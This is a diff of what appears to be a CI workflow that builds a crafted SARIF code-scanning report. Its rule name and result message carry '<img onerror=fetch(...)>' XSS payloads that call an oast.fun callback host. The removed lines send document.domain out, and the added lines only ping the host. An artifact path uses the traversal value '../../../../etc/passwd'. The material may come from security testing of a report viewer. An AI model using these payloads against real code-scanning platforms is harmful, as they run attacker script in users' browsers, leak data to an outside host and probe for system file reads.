@@ -24,7 +24,7 @@ jobs:
                   "version": "1",
                   "rules": [{
                     "id": "G10-XSS",
-                    "name": "<img src=x onerror=fetch(\\\"https://d9ogvgsino337373fglg9w7ghoqyjss4k.oast.fun/xss?n=\\\"+encodeURIComponent(document.domain))>",
+                    "name": "<img src=x onerror=fetch('https://d9ogvgsino337373fglg9w7ghoqyjss4k.oast.fun/xss-rule')>",
                     "shortDescription": {"text": "G10 parser boundary <b>sentinel</b>"}
                   }]
                 }
@@ -32,7 +32,7 @@ jobs:
               "results": [{
                 "ruleId": "G10-XSS",
                 "level": "error",
-                "message": {"text": "<img src=x onerror=fetch(\\\"https://d9ogvgsino337373fglg9w7ghoqyjss4k.oast.fun/xss?m=\\\"+encodeURIComponent(document.domain))>"},
+                "message": {"text": "<img src=x onerror=fetch('https://d9ogvgsino337373fglg9w7ghoqyjss4k.oast.fun/xss-message')>"},
                 "locations": [{
                   "physicalLocation": {
                     "artifactLocation": {"uri": "../../../../etc/passwd"},
